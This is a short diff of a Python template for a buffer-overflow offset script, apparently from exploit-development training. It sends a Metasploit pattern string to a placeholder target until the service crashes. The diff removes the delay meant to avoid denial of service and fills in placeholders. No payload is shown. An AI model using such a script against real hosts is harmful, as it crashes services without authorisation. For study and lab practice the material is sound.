@@ -1,15 +1,13 @@
 #!/usr/bin/python3
 # Socket: Needed to send data to the port socket of the target host.
-# Time: Needed to sleep X amount of seconds between requests as to not DOS the target host.
 # Sys: Needed to exit the python program if we are unable to connect to the target host.
-import socket, time, sys
+import socket, sys
 
 # CHANGE THESE!!!
-target_IP = 1.1.1.1
-target_port = XXXX
+target_IP = [IP]
+target_port = [port]
 ## Enter in the msf-pattern_create string.
-input_msf_pattern = XXXX
-
+input_msf_pattern = [msf-patter_create string]
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
